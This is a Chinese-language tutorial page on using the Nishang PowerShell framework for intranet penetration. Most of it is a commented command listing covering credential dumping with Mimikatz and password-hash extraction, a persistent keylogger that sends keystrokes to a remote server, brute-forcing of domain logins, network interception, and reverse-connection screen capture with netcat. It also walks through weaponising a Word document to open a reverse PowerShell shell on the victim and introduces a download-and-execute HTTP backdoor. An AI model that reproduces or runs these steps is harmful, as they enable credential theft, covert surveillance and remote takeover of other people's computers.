+<p>各种命令解析： <a href="https://www.explainshell.com"target="_blank" rel="external nofollow noopener noreferrer">https://www.explainshell.com<i class="fa-solid fa-external-link-alt fa-fw fa-xs ms-1 text-secondary" aria-hidden="true"></i></a></p>
+</blockquote>
+<h4 id="安装问题">安装问题</h4>
+<p>nishang的使用是要在PowerShell3.0以上的环境中才可以正常使用。也就是说win7下是有点小问题的（win7下自带的环境是PowerShell 2.0， 自行升级）</p>
+<ul>
+<li>powershell ISE是一个编译器</li>
+<li>powershell有很多渗透框架：</li>
+<li>PowerSploit(最多，但是没维护了)、Empire、NiShang(一直更新，推荐), 学一种就行，大同小异</li>
+</ul>
+<blockquote>
+<p>实际渗透中，肯定不能把Nishang整个目录都读到目标服务器上，所以在下载某一个脚本的时候，了解目录结构很重要</p>
+</blockquote>
+<h4 id="目录结构">目录结构：</h4>
+<p><img src="http://image.xpshuai.cn/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E7%9B%AE%E5%BD%95.png"></img></p>
+<h4 id="模块和功能介绍">模块和功能介绍：</h4>
+<p><img src="http://image.xpshuai.cn/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E5%8A%9F%E8%83%BD.png"></img></p>
+<h4 id="演示">演示：</h4>
+<p>端口扫描 密码获取 键盘记录 反弹会话 口令爆破</p>
+<h4 id="实战应用">实战应用：</h4>
+<ul>
+<li>后续控制</li>
+<li>域渗透</li>
+<li>系统提权</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">  1
+</span><span class="lnt">  2
+</span><span class="lnt">  3
+</span><span class="lnt">  4
+</span><span class="lnt">  5
+</span><span class="lnt">  6
+</span><span class="lnt">  7
+</span><span class="lnt">  8
+</span><span class="lnt">  9
+</span><span class="lnt"> 10
+</span><span class="lnt"> 11
+</span><span class="lnt"> 12
+</span><span class="lnt"> 13
+</span><span class="lnt"> 14
+</span><span class="lnt"> 15
+</span><span class="lnt"> 16
+</span><span class="lnt"> 17
+</span><span class="lnt"> 18
+</span><span class="lnt"> 19
+</span><span class="lnt"> 20
+</span><span class="lnt"> 21
+</span><span class="lnt"> 22
+</span><span class="lnt"> 23
+</span><span class="lnt"> 24
+</span><span class="lnt"> 25
+</span><span class="lnt"> 26
+</span><span class="lnt"> 27
+</span><span class="lnt"> 28
+</span><span class="lnt"> 29
+</span><span class="lnt"> 30
+</span><span class="lnt"> 31
+</span><span class="lnt"> 32
+</span><span class="lnt"> 33
+</span><span class="lnt"> 34
+</span><span class="lnt"> 35
+</span><span class="lnt"> 36
+</span><span class="lnt"> 37
+</span><span class="lnt"> 38
+</span><span class="lnt"> 39
+</span><span class="lnt"> 40
+</span><span class="lnt"> 41
+</span><span class="lnt"> 42
+</span><span class="lnt"> 43
+</span><span class="lnt"> 44
+</span><span class="lnt"> 45
+</span><span class="lnt"> 46
+</span><span class="lnt"> 47
+</span><span class="lnt"> 48
+</span><span class="lnt"> 49
+</span><span class="lnt"> 50
+</span><span class="lnt"> 51
+</span><span class="lnt"> 52
+</span><span class="lnt"> 53
+</span><span class="lnt"> 54
+</span><span class="lnt"> 55
+</span><span class="lnt"> 56
+</span><span class="lnt"> 57
+</span><span class="lnt"> 58
+</span><span class="lnt"> 59
+</span><span class="lnt"> 60
+</span><span class="lnt"> 61
+</span><span class="lnt"> 62
+</span><span class="lnt"> 63
+</span><span class="lnt"> 64
+</span><span class="lnt"> 65
+</span><span class="lnt"> 66
+</span><span class="lnt"> 67
+</span><span class="lnt"> 68
+</span><span class="lnt"> 69
+</span><span class="lnt"> 70
+</span><span class="lnt"> 71
+</span><span class="lnt"> 72
+</span><span class="lnt"> 73
+</span><span class="lnt"> 74
+</span><span class="lnt"> 75
+</span><span class="lnt"> 76
+</span><span class="lnt"> 77
+</span><span class="lnt"> 78
+</span><span class="lnt"> 79
+</span><span class="lnt"> 80
+</span><span class="lnt"> 81
+</span><span class="lnt"> 82
+</span><span class="lnt"> 83
+</span><span class="lnt"> 84
+</span><span class="lnt"> 85
+</span><span class="lnt"> 86
+</span><span class="lnt"> 87
+</span><span class="lnt"> 88
+</span><span class="lnt"> 89
+</span><span class="lnt"> 90
+</span><span class="lnt"> 91
+</span><span class="lnt"> 92
+</span><span class="lnt"> 93
+</span><span class="lnt"> 94
+</span><span class="lnt"> 95
+</span><span class="lnt"> 96
+</span><span class="lnt"> 97
+</span><span class="lnt"> 98
+</span><span class="lnt"> 99
+</span><span class="lnt">100
+</span><span class="lnt">101
+</span><span class="lnt">102
+</span><span class="lnt">103
+</span><span class="lnt">104
+</span><span class="lnt">105
+</span><span class="lnt">106
+</span><span class="lnt">107
+</span><span class="lnt">108
+</span><span class="lnt">109
+</span><span class="lnt">110
+</span><span class="lnt">111
+</span><span class="lnt">112
+</span><span class="lnt">113
+</span><span class="lnt">114
+</span><span class="lnt">115
+</span><span class="lnt">116
+</span><span class="lnt">117
+</span><span class="lnt">118
+</span><span class="lnt">119
+</span><span class="lnt">120
+</span><span class="lnt">121
+</span><span class="lnt">122
+</span><span class="lnt">123
+</span><span class="lnt">124
+</span><span class="lnt">125
+</span><span class="lnt">126
+</span><span class="lnt">127
+</span><span class="lnt">128
+</span><span class="lnt">129
+</span><span class="lnt">130
+</span><span class="lnt">131
+</span><span class="lnt">132
+</span><span class="lnt">133
+</span><span class="lnt">134
+</span><span class="lnt">135
+</span><span class="lnt">136
+</span><span class="lnt">137
+</span><span class="lnt">138
+</span><span class="lnt">139
+</span><span class="lnt">140
+</span><span class="lnt">141
+</span><span class="lnt">142
+</span><span class="lnt">143
+</span><span class="lnt">144
+</span><span class="lnt">145
+</span><span class="lnt">146
+</span><span class="lnt">147
+</span><span class="lnt">148
+</span><span class="lnt">149
+</span><span class="lnt">150
+</span><span class="lnt">151
+</span><span class="lnt">152
+</span><span class="lnt">153
+</span><span class="lnt">154
+</span><span class="lnt">155
+</span><span class="lnt">156
+</span><span class="lnt">157
+</span><span class="lnt">158
+</span><span class="lnt">159
+</span><span class="lnt">160
+</span><span class="lnt">161
+</span><span class="lnt">162
+</span><span class="lnt">163
+</span><span class="lnt">164
+</span><span class="lnt">165
+</span><span class="lnt">166
+</span><span class="lnt">167
+</span><span class="lnt">168
+</span><span class="lnt">169
+</span><span class="lnt">170
+</span><span class="lnt">171
+</span><span class="lnt">172
+</span><span class="lnt">173
+</span><span class="lnt">174
+</span><span class="lnt">175
+</span><span class="lnt">176
+</span><span class="lnt">177
+</span><span class="lnt">178
+</span><span class="lnt">179
+</span><span class="lnt">180
+</span><span class="lnt">181
+</span><span class="lnt">182
+</span><span class="lnt">183
+</span><span class="lnt">184
+</span><span class="lnt">185
+</span><span class="lnt">186
+</span><span class="lnt">187
+</span><span class="lnt">188
+</span><span class="lnt">189
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-mysql" data-lang="mysql"><span class="line"><span class="cl"><span class="c1"># 使用，导入框架（如果出错，重新以管理员运行:执行`Set-ExecutionPolicy remotesigned`）
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Import</span><span class="o">-</span><span class="n">Module</span><span class="w"> </span><span class="p">.</span><span class="n">nishang</span><span class="p">.</span><span class="n">psml</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1"># 载入模块  查看NiShang都有哪些模块
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Get</span><span class="o">-</span><span class="n">Command</span><span class="w"> </span><span class="o">-</span><span class="n">Moudle</span><span class="w"> </span><span class="n">nishang</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">## 查看机器基本信息
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Get</span><span class="o">-</span><span class="n">Information</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1"># 把结果导出文件  Out-File
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Get</span><span class="o">-</span><span class="n">Information</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="k">Out</span><span class="o">-</span><span class="n">File</span><span class="w"> </span><span class="n">res</span><span class="p">.</span><span class="n">txt</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1"># 检测是否为虚拟机
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">Check</span><span class="o">-</span><span class="n">VM</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">## 获取密码
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Invoke</span><span class="o">-</span><span class="n">Minikatz</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">#Dump出本机的凭证信息
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="n">Invoke</span><span class="o">-</span><span class="n">Minikatz</span><span class="w"> </span><span class="o">-</span><span class="n">DumpCerts</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">#dump出远程的两台计算机的凭证信息
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="n">Invoke</span><span class="o">-</span><span class="n">Minikatz</span><span class="w"> </span><span class="o">-</span><span class="n">ComputerName</span><span class="w"> </span><span class="o">@</span><span class="p">(</span><span class="s2">&#34;computer1&#34;</span><span class="p">,</span><span class="w"> </span><span class="s2">&#34;computer2&#34;</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">#在远程的一台机器上运行Mimikatz 并执行 &#34;privilege::debug exit&#34;
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="n">Invoke</span><span class="o">-</span><span class="n">Minikatz</span><span class="w"> </span><span class="o">-</span><span class="n">Command</span><span class="w"> </span><span class="s2">&#34;privilege::debug exit&#34;</span><span class="w"> </span><span class="o">-</span><span class="n">ComputerName</span><span class="o">@</span><span class="p">(</span><span class="s2">&#34;computer1&#34;</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1"># Get-PassHashes 获取密码
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1"># 在administrator的权限下可以dump出密码hash值（在在msf中的power dump模块进行了修改，不需要system权限就可以dump）
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Get</span><span class="o">-</span><span class="n">PassHashes</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1"># 获取用户的密码提示信息(需要有administrator的权限) 可以根据提示信息生成密码字典，提高爆破成功率
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Get</span><span class="o">-</span><span class="n">PassHints</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">## 获取帮助参数  Get-Help
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Get</span><span class="o">-</span><span class="n">Help</span><span class="w"> </span><span class="n">Invoke</span><span class="o">-</span><span class="n">PortScan</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">## 端口扫描
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="err">查看帮助信息</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Get</span><span class="o">-</span><span class="n">Help</span><span class="w"> </span><span class="n">Invoke</span><span class="o">-</span><span class="n">PortScan</span><span class="w"> </span><span class="o">-</span><span class="n">full</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Invoke</span><span class="o">-</span><span class="n">PortScan</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Invoke</span><span class="o">-</span><span class="n">PortScan</span><span class="w"> </span><span class="o">-</span><span class="n">StartAddress</span><span class="w"> </span><span class="mi">192</span><span class="p">.</span><span class="mi">168</span><span class="p">.</span><span class="mi">0</span><span class="p">.</span><span class="mi">100</span><span class="w"> </span><span class="o">-</span><span class="n">EndAddress</span><span class="w"> </span><span class="mi">192</span><span class="p">.</span><span class="mi">168</span><span class="p">.</span><span class="mi">0</span><span class="p">.</span><span class="mi">155</span><span class="w"> </span><span class="o">-</span><span class="n">ResolveHost</span><span class="w"> 
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1"># cd 切换到对应目录
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">## 测试键盘记录:  
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Get</span><span class="o">-</span><span class="n">Help</span><span class="w"> </span><span class="p">.</span><span class="err">\</span><span class="n">Keylogger</span><span class="p">.</span><span class="n">ps1</span><span class="w"> </span><span class="o">--</span><span class="n">full</span><span class="w">   </span><span class="c1"># 查看帮助（提供了四种方式记录）
+</span></span></span><span class="line"><span class="cl"><span class="c1">#-URL 要把记录发Keylogger送到的置顶的远程服务器    ,    -CheckURL 会检查所给出的网页中是够包含“MagicString”， 如果有就停止记录
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">.</span><span class="err">\</span><span class="n">gather</span><span class="err">\</span><span class="n">Keylogger</span><span class="p">.</span><span class="n">ps1</span><span class="w"> </span><span class="o">-</span><span class="n">CheckURL</span><span class="w"> </span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">pastebin</span><span class="p">.</span><span class="n">com</span><span class="o">/</span><span class="n">raw</span><span class="p">.</span><span class="n">php</span><span class="o">?</span><span class="n">i</span><span class="o">=</span><span class="n">jqP2vJ3x</span><span class="w"> </span><span class="o">-</span><span class="n">MagicString</span><span class="w"> </span><span class="n">stopthis</span><span class="w"> </span><span class="o">-</span><span class="n">exfil</span><span class="w"> </span><span class="o">-</span><span class="n">ExfilOption</span><span class="w"> </span><span class="n">WebServer</span><span class="w"> </span><span class="o">-</span><span class="n">URL</span><span class="w"> </span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mi">192</span><span class="p">.</span><span class="mi">168</span><span class="p">.</span><span class="mi">254</span><span class="p">.</span><span class="mi">226</span><span class="o">/</span><span class="n">data</span><span class="o">/</span><span class="n">catch</span><span class="p">.</span><span class="n">php</span><span class="w"> 
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1"># 解释： 将记录指定发送给一个可以记录Post请求的Web服务器
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1"># 默认保存到(内容是ascii码)： Windows/Temp/key.log
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1"># 把ascii记录解析为非ascii：
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Parse_Keys</span><span class="w"> </span><span class="p">.</span><span class="err">\</span><span class="k">key</span><span class="p">.</span><span class="n">log</span><span class="w"> </span><span class="p">.</span><span class="err">\</span><span class="n">parsed</span><span class="p">.</span><span class="n">txt</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1"># 持久化记录（重启之后也记录）
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">.</span><span class="err">\</span><span class="n">Keylogger</span><span class="p">.</span><span class="n">ps1</span><span class="w"> </span><span class="o">-</span><span class="n">persist</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">## 爆破口令  在scan目录下面
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">#用于对SQL Server、域控制器、Web和FTP弱口令爆破
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="n">Invoke</span><span class="o">-</span><span class="n">BruteForce</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">#命令参数如下
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">-</span><span class="n">ComputerName</span><span class="w">    </span><span class="c1"># 对应服务的计算机名
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">-</span><span class="n">UserList</span><span class="w">  </span><span class="err">用户名字典</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">-</span><span class="n">PasswordList</span><span class="w">  </span><span class="err">密码字典</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">-</span><span class="n">Service</span><span class="w"> </span><span class="err">服务（默认为：</span><span class="k">SQL</span><span class="err">）</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">-</span><span class="n">StopOnSuccess</span><span class="w">   </span><span class="err">匹配一个后停止</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">-</span><span class="n">Delay</span><span class="w">    </span><span class="err">延迟时间</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">#比如
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="n">Invoke</span><span class="o">-</span><span class="n">BruteForce</span><span class="w"> </span><span class="o">-</span><span class="n">ComputerName</span><span class="w">  </span><span class="n">xx</span><span class="o">-</span><span class="n">PC</span><span class="w">  </span><span class="o">-</span><span class="n">UserList</span><span class="w"> </span><span class="k">user</span><span class="p">.</span><span class="n">txt</span><span class="w">  </span><span class="o">-</span><span class="n">PasswordList</span><span class="w"> </span><span class="n">pass</span><span class="p">.</span><span class="n">txt</span><span class="w">  </span><span class="o">-</span><span class="n">Service</span><span class="w"> </span><span class="n">ActiveDirectory</span><span class="w">  </span><span class="o">-</span><span class="n">Verbose</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1"># 内网扫描器
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1"># 用于对内网进行扫描，打开本地监听，然后远程传送数据，把把发送给FireListener
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">#1.在本机开启监听
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="n">FireListener</span><span class="w"> </span><span class="mi">130</span><span class="o">-</span><span class="mi">150</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">#2.在目标机器输入命令：
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="n">FireListener</span><span class="w"> </span><span class="mi">192</span><span class="p">.</span><span class="mi">168</span><span class="p">.</span><span class="mi">0</span><span class="p">.</span><span class="mi">107</span><span class="w"> </span><span class="mi">130</span><span class="o">-</span><span class="mi">150</span><span class="w"> </span><span class="o">-</span><span class="n">Verbose</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">## 内网嗅探
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="err">动静很大，实在没有办法的时候可以试试</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="err">目标机执行以下命令</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Invoke</span><span class="o">-</span><span class="n">Interceptor</span><span class="w"> </span><span class="o">-</span><span class="n">ProxyServer</span><span class="w"> </span><span class="mi">192</span><span class="p">.</span><span class="mi">168</span><span class="p">.</span><span class="mi">250</span><span class="p">.</span><span class="mi">172</span><span class="w"> </span><span class="o">-</span><span class="n">ProxyPort</span><span class="w"> </span><span class="mi">9999</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="err">本机监听</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">nc</span><span class="w"> </span><span class="o">-</span><span class="n">lvvp</span><span class="w"> </span><span class="mi">9999</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">## 屏幕窃取   Show-TargetScreen
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">#本机可以使用nc获取powercat进行监听（在本地使用支持MJPEG的浏览器比如firefox，访问本机对应监听端口，即可在浏览器上看到从远端传输回来的实时画面，正向反向均可）
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">Show</span><span class="o">-</span><span class="n">TargetScreen</span><span class="w"> </span><span class="o">-</span><span class="n">Reverse</span><span class="w"> </span><span class="o">-</span><span class="n">IPAddress</span><span class="w"> </span><span class="mi">192</span><span class="p">.</span><span class="mi">168</span><span class="p">.</span><span class="mi">230</span><span class="p">.</span><span class="mi">1</span><span class="w"> </span><span class="o">-</span><span class="n">Port</span><span class="w"> </span><span class="mi">443</span><span class="w">   </span><span class="c1"># 将远程的画面传输给 192.168.230.1 的443端口
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="err">参数：</span><span class="w"> </span><span class="n">Bind</span><span class="w"> </span><span class="o">--&gt;</span><span class="w"> </span><span class="err">正向连接</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="err">在目标机执行以下命令（反向连接）</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">Show</span><span class="o">-</span><span class="n">TargetScreen</span><span class="w">  </span><span class="o">-</span><span class="n">IPAddress</span><span class="w"> </span><span class="mi">192</span><span class="p">.</span><span class="mi">168</span><span class="p">.</span><span class="mi">230</span><span class="p">.</span><span class="mi">172</span><span class="w"> </span><span class="o">-</span><span class="n">Port</span><span class="w"> </span><span class="mi">3333</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="err">本机输入以下命令</span><span class="w"> </span><span class="err">，接着访问本机的</span><span class="mi">9999</span><span class="err">端口</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">nc</span><span class="w"> </span><span class="o">-</span><span class="n">nlvp</span><span class="w"> </span><span class="mi">3333</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">nc</span><span class="w"> </span><span class="o">-</span><span class="n">nlvp</span><span class="w"> </span><span class="mi">9999</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="err">正向连接</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="err">目标机执行：</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">Show</span><span class="o">-</span><span class="n">TargetScreen</span><span class="w"> </span><span class="o">-</span><span class="n">Bind</span><span class="w"> </span><span class="o">-</span><span class="n">Port</span><span class="w"> </span><span class="mi">3333</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="err">本机执行：</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">nc</span><span class="w"> </span><span class="o">-</span><span class="n">nv</span><span class="w"> </span><span class="mi">192</span><span class="p">.</span><span class="mi">168</span><span class="p">.</span><span class="mi">230</span><span class="p">.</span><span class="mi">37</span><span class="w"> </span><span class="mi">3333</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">nc</span><span class="w"> </span><span class="o">-</span><span class="n">lnvp</span><span class="w"> </span><span class="mi">9999</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">## Client 的生成(类似木马)
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="err">需要自己绑定</span><span class="n">payload</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="err">首先在本机监听：</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">nc</span><span class="w"> </span><span class="o">-</span><span class="n">lvp</span><span class="w"> </span><span class="mi">4444</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="err">接着制作</span><span class="n">word</span><span class="err">文件，打开\</span><span class="n">nishang</span><span class="err">\</span><span class="n">Shell</span><span class="err">\</span><span class="n">Invoke</span><span class="o">-</span><span class="n">PowerShellTcpOneLine</span><span class="p">.</span><span class="n">ps1</span><span class="err">文件，复制第三行的内容，可以看到有一个</span><span class="o">`</span><span class="n">TcpClient</span><span class="o">`</span><span class="err">的参数，这就是远程连接的地址，把他改为本机的</span><span class="n">IP</span><span class="err">和你监听的端口，改完以后复制代码，在命令行下如下执行</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Invoke</span><span class="o">-</span><span class="n">Encode</span><span class="w"> </span><span class="o">-</span><span class="n">DataToEncode</span><span class="w"> </span><span class="s1">&#39;复制的代码&#39;</span><span class="w"> </span><span class="o">-</span><span class="n">IsString</span><span class="w"> </span><span class="o">-</span><span class="n">PostScript</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="err">执行完之后会在当前目录生成两个文件，一个是</span><span class="n">encode</span><span class="p">.</span><span class="n">txt</span><span class="err">，</span><span class="w"> </span><span class="err">一个是</span><span class="n">encodedcommand</span><span class="p">.</span><span class="n">txt</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="err">接着执行命令</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">Out</span><span class="o">-</span><span class="n">Word</span><span class="o">-</span><span class="n">PayloadScript</span><span class="w"> </span><span class="p">.</span><span class="err">\</span><span class="n">encodedcommand</span><span class="p">.</span><span class="n">txt</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="err">会生成一个</span><span class="n">word</span><span class="err">文档，用户打开就中招，我们获取到反弹的</span><span class="n">powershell</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">##  后门
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="mi">1</span><span class="p">.</span><span class="n">Http</span><span class="o">-</span><span class="n">Backdoor</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="err">可以帮助我们在目标机器上下载和执行</span><span class="n">powershell</span><span class="err">脚本，接收来自第三方网站的制定，然后在内存中执行</span><span class="n">powershell</span><span class="err">脚本</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
